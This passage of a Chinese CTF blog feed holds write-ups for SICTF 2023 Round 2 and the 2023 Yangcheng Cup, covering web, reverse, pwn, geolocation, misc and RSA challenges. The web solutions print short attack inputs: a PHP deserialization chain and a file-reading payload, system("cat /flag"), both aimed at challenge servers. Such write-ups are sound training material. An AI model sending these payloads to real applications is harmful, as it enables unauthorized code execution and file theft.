/?p=SICTF169e8299-2241-4b2e-9726-1c32f212ca51 HTTP/1.1&quot; 200 -</code></p><p>​    </p><h3 id="RCE"><a href="#RCE" class="headerlink" title="RCE"></a>RCE</h3><p>POST <code>/</code></p><p><code>code=include &quot;/flag&quot;;</code></p><p>​    </p><h3 id="我全都要"><a href="#我全都要" class="headerlink" title="我全都要"></a>我全都要</h3><p>写反序列化链：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> phpserialize <span class="keyword">import</span> serialize</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">P</span>:</span><br><span class="line">    public_MyLover=<span class="string">&#x27;x&#x27;</span></span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_i=<span class="string">&#x27;1&#x27;</span></span><br><span class="line">    public_nogame=P()</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span>:</span><br><span class="line">    public_Aec=B()</span><br><span class="line">    public_girl=[<span class="string">&#x27;1&#x27;</span>]</span><br><span class="line">    public_boy=[<span class="string">&#x27;2&#x27;</span>]</span><br><span class="line">    </span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span>:</span><br><span class="line">    public_pop=A()</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(serialize(B()))</span><br><span class="line"></span><br><span class="line"><span class="comment"># O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p>POST <code>?A_B_C=O:1:&quot;B&quot;:1:&#123;s:3:&quot;pop&quot;;O:1:&quot;A&quot;:3:&#123;s:3:&quot;Aec&quot;;O:1:&quot;B&quot;:2:&#123;s:1:&quot;i&quot;;s:1:&quot;1&quot;;s:6:&quot;nogame&quot;;O:1:&quot;P&quot;:1:&#123;s:7:&quot;MyLover&quot;;s:1:&quot;x&quot;;&#125;&#125;s:3:&quot;boy&quot;;a:1:&#123;i:0;s:1:&quot;2&quot;;&#125;s:4:&quot;girl&quot;;a:1:&#123;i:0;s:1:&quot;1&quot;;&#125;&#125;&#125;</code></p><p><code>cmd=system(&quot;cat /flag&quot;);</code></p><p>​    </p><h2 id="REVERSE"><a href="#REVERSE" class="headerlink" title="REVERSE"></a>REVERSE</h2><h3 id="签到-PYC"><a href="#签到-PYC" class="headerlink" title="[签到]PYC"></a>[签到]PYC</h3><p>pyc反编译，得flag。</p><p><code>SICTF&#123;07e278e7-9d66-4d90-88fc-8bd61e490616&#125;</code></p><p>​    </p><h3 id="Myobject"><a href="#Myobject" class="headerlink" title="Myobject"></a>Myobject</h3><p>动调，发现是RC4，key为 <code>SIFLAG</code>，密文为 <code>3027D30E5A22CF47476B0BE58D53BA99C3850707011C7710FE889F</code>。</p><p>解密RC4，得flag：<code>SICTF&#123;wow_you_get_the_flag&#125;</code>。</p><p>​    </p><h3 id="chbase"><a href="#chbase" class="headerlink" title="chbase"></a>chbase</h3><p>搜索字符串得</p><p>码表：<code>ZYXWVUTSRQPONMLKJIHGFEDCBAabcdefghijklmnopqrstuvwxyz0123456789+/</code></p><p>密文：<code>F0lWEVA7BmUzAGB0C2UuAU9hbnIpATEidDdnACQ9</code></p><p>base64解码得flag：<code>SICTF&#123;base64_and_antidebugger&#125;</code></p><p>​    </p><h3 id="不一样的base64"><a href="#不一样的base64" class="headerlink" title="不一样的base64"></a>不一样的base64</h3><p>pyinstxtractor解包得到111.pyc，反编译得到：</p><p><code>U0lDVEZ7OGUwZDM1OGQtOGI5ZC00ODY2LTliMDItNjc0OWIwN2FkMDlhfQAA</code></p><p>base64解码得flag：<code>SICTF&#123;8e0d358d-8b9d-4866-9b02-6749b07ad09a&#125;</code></p><p>​    </p><h3 id="javacode"><a href="#javacode" class="headerlink" title="javacode"></a>javacode</h3><p>JVM字节码，参考 <a href="https://zhuanlan.zhihu.com/p/412472914">两张图让你快速读懂JVM字节码指令</a> 理加密逻辑，已知key和密文c，关键运算为：</p><p><code>c[i] = (((m[i]^m[i+1])-k[i])^k[i])%256</code></p><p>还原：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">c = [<span class="number">148</span>,<span class="number">136</span>,<span class="number">151</span>,<span class="number">234</span>,<span class="number">177</span>,<span class="number">48</span>,<span class="number">226</span>,<span class="number">234</span>,<span class="number">214</span>,<span class="number">177</span>,<span class="number">168</span>,<span class="number">176</span>,<span class="number">151</span>,<span class="number">250</span>,<span class="number">19</span>,<span class="number">20</span>,<span class="number">253</span>,<span class="number">52</span>,<span class="number">72</span>,<span class="number">176</span>,<span class="number">170</span>,<span class="number">140</span>,<span class="number">176</span>,<span class="number">236</span>,<span class="number">54</span>,<span class="number">231</span>,<span class="number">212</span>,<span class="number">237</span>,<span class="number">135</span>,<span class="number">151</span>,<span class="number">150</span>,<span class="number">135</span>,<span class="number">217</span>,<span class="number">231</span>,<span class="number">229</span>,<span class="number">32</span>,<span class="number">90</span>]</span><br><span class="line">k = <span class="built_in">list</span>(<span class="string">b&#x27;SICTF2023&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;_&#123;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = [<span class="number">83</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(c)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">33</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> (((m[-<span class="number">1</span>]^j)-k[i%<span class="built_in">len</span>(k)])^k[i%<span class="built_in">len</span>(k)])%<span class="number">256</span> == c[i]:</span><br><span class="line">            m.append(j)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(m))</span><br><span class="line"></span><br><span class="line"><span class="comment"># b&#x27;SICTF&#123;OMG_j@vac0de_1s_sO_interesting!&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="签到-Shop"><a href="#签到-Shop" class="headerlink" title="[签到]Shop"></a>[签到]Shop</h3><p>整数溢出漏洞，输入-1得flag。</p><p>​    </p><h2 id="FORENSICS"><a href="#FORENSICS" class="headerlink" title="FORENSICS"></a>FORENSICS</h2><h3 id="购物之旅"><a href="#购物之旅" class="headerlink" title="购物之旅"></a>购物之旅</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;北京市_顺义区_新顺南大街_北京华联顺义金街购物中心&#125;</code></p><p>​    </p><h3 id="天桥"><a href="#天桥" class="headerlink" title="天桥"></a>天桥</h3><p>辨认出梧桐树，再关键字搜索城市。</p><p><code>SICTF&#123;陕西省西安市碑林区友谊路&#125;</code></p><p>​    </p><h3 id="美女姐姐O-o"><a href="#美女姐姐O-o" class="headerlink" title="美女姐姐O.o"></a>美女姐姐O.o</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;福建省福州市仓山区烟台山公园&#125;</code></p><p>​    </p><h3 id="宝塔镇河妖"><a href="#宝塔镇河妖" class="headerlink" title="宝塔镇河妖"></a>宝塔镇河妖</h3><p>百度识图+关键字搜索。</p><p><code>SICTF&#123;山东省济宁市汶上县太子灵踪塔&#125;</code></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​    &lt;/p&gt;
&lt;p&gt;SICTF2023 #Round2 是杭州电子科技大学信息工程学院和广东海洋大学联合举办的网络安全赛。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;Rank: 4&lt;/strong&gt;&lt;/p&gt;
&lt;hr&gt;
&lt;h2 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; c</summary>
      
    
    
    
    <category term="match" scheme="https://lazzzaro.github.io/categories/match/"/>
    
    
    <category term="2023赛" scheme="https://lazzzaro.github.io/tags/2023%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>2023年羊城杯网络安全大赛</title>
    <link href="https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    <id>https://lazzzaro.github.io/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/</id>
    <published>2023-09-02T15:19:34.000Z</published>
    <updated>2023-09-03T02:23:43.500Z</updated>
    
    <content type="html"><![CDATA[<p>​    </p><p>竞赛时间</p><p>2023-09-02 09:00:00~2023-09-03 09:00:00</p><p>竞赛简介</p><p>目前我国网民规模已突破9亿，成为名副其实的网络大国，但我国与网络强国相比还有一定距离。习近平总书记指出：要建立高素质网络安全和信息化人才队伍，将我国建设成网络强国。建设网络强国需要高素质的网络安全和信息化人才队伍。网络安全人才是国家网络安全建设的核心资源，其数量、质量和结构是衡量国家网络安全软实力和竞争力的重要标志。 为积极响应国家网络强国建设对网络安全人才的需求，提升人民的网络安全知识水平和实践力，特举办2023年“羊城杯”网络安全大赛。</p><hr><h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="EZ-misc"><a href="#EZ-misc" class="headerlink" title="EZ_misc"></a>EZ_misc</h3><blockquote><p>一道简单的misc捏..</p></blockquote><p>16进制查看，末尾修改 <code>504b0403</code> 为 <code>504b0304</code> 后提取出zip文件，得到一串密文 <code>vzbtrvplnnvphsqkxsiqibroou</code>。</p><p>根据图片名Grons和压缩包内文件名feld，组合得到Gronsfeld为一种密码，爆破密钥得到提示：<code>try to think the s nipping tools</code>，为Win10/11截图工具漏洞aCropalypse（CVE-2023-28303）。</p><p>利用<a href="https://github.com/frankthetank-music/Acropalypse-Multi-Tool">Acropalypse Multi Tool工具</a>修复png宽高，还原得到flag：</p><p><img src="/2023/09/02/match-2023%E5%B9%B4%E7%BE%8A%E5%9F%8E%E6%9D%AF%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/image-20230903014924226.png" alt="image-20230903014924226"></p><p>​    </p><h2 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h2><h3 id="Danger-RSA"><a href="#Danger-RSA" class="headerlink" title="Danger_RSA"></a>Danger_RSA</h3><blockquote><p>看似简单的rsa</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = getRandomRange(<span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">4</span>), <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>))</span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line"></span><br><span class="line">p, s = get_key(a, <span class="number">1024</span>)</span><br><span class="line">q, t = get_key(a, <span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">N = p * q</span><br><span class="line">e = s * t</span><br><span class="line">c = <span class="built_in">pow</span>(m, e, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;N =&quot;</span>, N)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;e =&quot;</span>, e)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c =&quot;</span>, c)</span><br><span class="line"><span class="comment"># N = 20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line"><span class="comment"># e = 11079917583</span></span><br><span class="line"><span class="comment"># c = 13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></blockquote><p>$N$ 为2038位，$p,q$ 至少为1024位，且生成函数 <code>get_key()</code> 的 $p=X^a+s$ 有 $X^a \gt\gt s$，且 $e$ 为34位，$s&lt;e$，故 $a$ 值不会太大，尝试爆破 $a$ 值：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>(<span class="params">a, nbit</span>):</span><br><span class="line">    <span class="keyword">assert</span> a &gt;= <span class="number">2</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        X = getRandomInteger(nbit // a)</span><br><span class="line">        s = <span class="built_in">pow</span>(<span class="number">2</span>, a ** <span class="number">2</span> - a + <span class="number">5</span>) <span class="comment"># 取可能的最大值</span></span><br><span class="line">        p = X ** a + s</span><br><span class="line">        <span class="keyword">if</span> isPrime(p):</span><br><span class="line">            <span class="keyword">return</span> (p, s)</span><br><span class="line">     </span><br><span class="line"><span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>,<span class="number">20</span>):</span><br><span class="line">    p, s = get_key(a,<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">if</span> s.bit_length() &lt; <span class="number">34</span>: <span class="comment"># s &lt; e</span></span><br><span class="line">        <span class="built_in">print</span>(a, p.bit_length(), s.bit_length())</span><br><span class="line">        </span><br><span class="line"><span class="comment"># 2 1021 8</span></span><br><span class="line"><span class="comment"># 3 1012 12</span></span><br><span class="line"><span class="comment"># 4 1020 18</span></span><br></pre></td></tr></table></figure><p>$a=4$ 时满足 $e=s \cdot t$ 的位数条件，有 $s \in [2^{a^2-a+4},2^{a^2-a+5})=[65536,131072)$。</p><p>分解 $e$，尝试其各因子，求 $s,t$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">4</span></span><br><span class="line"><span class="comment"># s ~ (65536,131072)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># e = 3 · 7^2 · 19 · 691 · 5741</span></span><br><span class="line">ed = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">7</span>, <span class="number">19</span>, <span class="number">21</span>, <span class="number">49</span>, <span class="number">57</span>, <span class="number">133</span>, <span class="number">147</span>, <span class="number">399</span>, <span class="number">691</span>, <span class="number">931</span>, <span class="number">2073</span>, <span class="number">2793</span>, <span class="number">4837</span>, <span class="number">5741</span>, <span class="number">13129</span>, <span class="number">14511</span>, <span class="number">17223</span>, <span class="number">33859</span>, <span class="number">39387</span>, <span class="number">40187</span>, <span class="number">91903</span>, <span class="number">101577</span>, <span class="number">109079</span>, <span class="number">120561</span>, <span class="number">275709</span>, <span class="number">281309</span>, <span class="number">327237</span>, <span class="number">643321</span>, <span class="number">763553</span>, <span class="number">843927</span>, <span class="number">1929963</span>, <span class="number">2290659</span>, <span class="number">3967031</span>, <span class="number">5344871</span>, <span class="number">11901093</span>, <span class="number">16034613</span>, <span class="number">27769217</span>, <span class="number">75373589</span>, <span class="number">83307651</span>, <span class="number">194384519</span>, <span class="number">226120767</span>, <span class="number">527615123</span>, <span class="number">583153557</span>, <span class="number">1582845369</span>, <span class="number">3693305861</span>, <span class="number">11079917583</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ed:</span><br><span class="line">    <span class="keyword">if</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>):</span><br><span class="line">        s = k</span><br><span class="line">        t = e // s</span><br><span class="line">        <span class="keyword">if</span> t <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">65536</span>,<span class="number">131072</span>) <span class="keyword">and</span> t &gt; s:</span><br><span class="line">            <span class="built_in">print</span>((s,t))</span><br><span class="line">            </span><br><span class="line"><span class="comment"># (91903, 120561)</span></span><br><span class="line"><span class="comment"># (101577, 109079)</span></span><br></pre></td></tr></table></figure><p>带入有 $p=X_1^4+s,q=X_2^4+t$，又 $X_1^4 \gt\gt s,X_2^4 \gt\gt t$，有 $(X_1X_2)^4 \approx N$，即 $X_1X_2= \lfloor\sqrt[4]{N}\rfloor$。结合 $N=pq=(X_1^4+s)(X_2^4+t)$，解 $X_1,X_2$：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">st = [(<span class="number">91903</span>, <span class="number">120561</span>), (<span class="number">101577</span>, <span class="number">109079</span>)]</span><br><span class="line"></span><br><span class="line">N = <span class="number">20289788565671012003324307131062103060859990244423187333725116068731043744218295859587498278382150779775620675092152011336913225797849717782573829179765649320271927359983554162082141908877255319715400550981462988869084618816967398571437725114356308935833701495015311197958172878812521403732038749414005661189594761246154666465178024563227666440066723650451362032162000998737626370987794816660694178305939474922064726534186386488052827919792122844587807300048430756990391177266977583227470089929347969731703368720788359127837289988944365786283419724178187242169399457608505627145016468888402441344333481249304670223</span></span><br><span class="line">e = <span class="number">11079917583</span></span><br><span class="line">c = <span class="number">13354219204055754230025847310134936965811370208880054443449019813095522768684299807719787421318648141224402269593016895821181312342830493800652737679627324687428327297369122017160142465940412477792023917546122283870042482432790385644640286392037986185997262289003477817675380787176650410819568815448960281666117602590863047680652856789877783422272330706693947399620261349458556870056095723068536573904350085124198592111773470010262148170379730937529246069218004969402885134027857991552224816835834207152308645148250837667184968030600819179396545349582556181916861808402629154688779221034610013350165801919342549766</span></span><br><span class="line">s = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">0</span>]) <span class="comment"># 另一组无解</span></span><br><span class="line">t = <span class="built_in">int</span>(st[<span class="number">0</span>][<span class="number">1</span>])</span><br><span class="line">y = <span class="built_in">int</span>(gmpy2.iroot(N,<span class="number">4</span>)[<span class="number">0</span>])</span><br><span class="line"></span><br><span class="line">P.&lt;x1,x2&gt; = PolynomialRing(ZZ)</span><br><span class="line">f1 = (x1^<span class="number">4</span>+s)*(x2^<span class="number">4</span>+t)-N</span><br><span class="line">f2 = x1*x2-y</span><br><span class="line">g = f1.resultant(f2, x2)</span><br><span class="line">X2 = g.univariate_polynomial().roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">X1 = y//X2</span><br><span class="line"><span class="built_in">print</span>((X1,X2))</span><br><span class="line"></span><br><span class="line">p = X1^<span class="number">4</span>+s</span><br><span class="line">q = X2^<span class="number">4</span>+t</span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> is_prime(p):</span><br><span class="line">    p = X2^<span class="number">4</span>+s</span><br><span class="line">    q = X1^<span class="number">4</span>+t</span><br><span class="line"><span class="built_in">print</span>(is_prime(p))</span><br><span class="line"><span class="built_in">print</span>(is_prime(q))</span><br><span class="line"></span><br><span class="line"><span class="comment"># AMM</span></span><br><span class="line"><span class="keyword">for</span> mp <span class="keyword">in</span> GF(p)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">for</span> mq <span class="keyword">in</span> GF(q)(c).nth_root(e, <span class="built_in">all</span>=<span class="literal">True</span>):</span><br><span class="line">        m = crt([ZZ(mp), ZZ(mq)], [p, q])</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            res = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:])</span><br><span class="line">            <span class="keyword">if</span> res.isascii():</span><br><span class="line">                <span class="built_in">print</span>(res)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        </span><br><span class="line"><span class="comment"># b&#x27;DASCTF&#123;C0nsTruct!n9_Techn1qUe2_f0r_RSA_Pr1me_EnC2ypt10N&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="Easy-3L"><a href="#Easy-3L" class="headerlink" title="Easy_3L"></a>Easy_3L</h3><blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">m = bytes_to_long(flag)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_key</span>():</span><br><span class="line">    p = getPrime(<span class="number">1400</span>)</span><br><span class="line">    f = getRandomNBitInteger(<span class="number">1024</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        q = getPrime(<span class="number">512</span>)</span><br><span class="line">        <span class="keyword">if</span> gcd(f, q) != <span class="number">1</span>:</span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    h = (invert(f, p) * q) % p</span><br><span class="line">    <span class="keyword">return</span> p, h</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt1</span>(<span class="params">m</span>):</span><br><span class="line">    a = getPrime(<span class="number">250</span>)</span><br><span class="line">    b = getRandomNBitInteger(<span class="number">240</span>)</span><br><span class="line">    n = getPrime(<span class="number">512</span>)</span><br><span class="line">    seed = m</span><br><span class="line">    s = [<span class="number">0</span>] * <span class="number">6</span></span><br><span class="line">    s[<span class="number">0</span>] = seed</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">6</span>):</span><br><span class="line">        s[i] = (s[i - <span class="number">1</span>] * a + b) % n</span><br><span class="line">    <span class="keyword">return</span> s</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt2</span>(<span class="params">msg, p, h</span>):</span><br><span class="line">    s = getRandomNBitInteger(<span class="number">512</span>)</span><br><span class="line">    c = (s * h + msg) % p</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = encrypt1(m)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S1 =&quot;</span>, s[<span class="number">1</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S2 =&quot;</span>, s[<span class="number">2</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S4 =&quot;</span>, s[<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;S5 =&quot;</span>, s[<span class="number">5</span>])</span><br><span class="line"></span><br><span class="line">p, h = 